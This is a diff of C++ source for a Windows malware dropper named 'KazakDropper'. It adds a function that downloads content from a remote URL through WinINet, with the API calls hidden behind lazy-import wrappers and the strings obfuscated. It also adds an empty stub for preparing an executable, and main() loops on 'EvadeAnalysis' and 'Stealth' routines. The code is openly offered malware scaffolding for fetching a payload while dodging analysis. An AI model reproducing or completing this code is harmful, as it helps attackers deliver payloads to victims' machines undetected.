@@ -63,6 +63,50 @@ void KazakDropper::Stealth()
 	std::this_thread::sleep_for(std::chrono::seconds(5));
 }
 
+void KazakDropper::PrepareExe()
+{
+	char* ExeBytes;
+
+}
+
+std::string KazakUtils::replace_all(std::string subject, const std::string& search, const std::string& replace)
+{
+	size_t pos = 0;
+	while ((pos = subject.find(search, pos)) != std::string::npos)
+	{
+		subject.replace(pos, search.length(), replace);
+		pos += replace.length();
+	}
+	return subject;
+}
+
+std::string StringWrapper(const std::string url)
+{
+	const HINTERNET connection = li(InternetOpenA)(enc("list_access\r\n"), INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, NULL);
+	std::string rtn;
+	if (connection)
+	{
+		const HINTERNET url_file = li(InternetOpenUrlA)(connection, url.c_str(), nullptr, NULL, NULL, NULL);
+		if (url_file)
+		{
+			char buffer[2000];
+			DWORD bytes_read;
+			do
+			{
+				li(InternetReadFile)(url_file, buffer, 2000, &bytes_read);
+				rtn.append(buffer, bytes_read);
+				memset(buffer, 0, 2000);
+			} while (bytes_read);
+			li(InternetCloseHandle)(connection);
+			li(InternetCloseHandle)(url_file);
+			std::string p = KazakUtils::replace_all(rtn, "|n", "\r\n");
+			return p;
+		}
+	}
+	li(InternetCloseHandle)(connection);
+	std::string p = KazakUtils::replace_all(rtn, "|n", "\r\n");
+	return p;
+}
 
 
 int main()
@@ -70,6 +114,7 @@ int main()
 	while (!KazakDropper::EvadeAnalysis())
 	{
 		KazakDropper::Stealth();
+
 
 
 	}
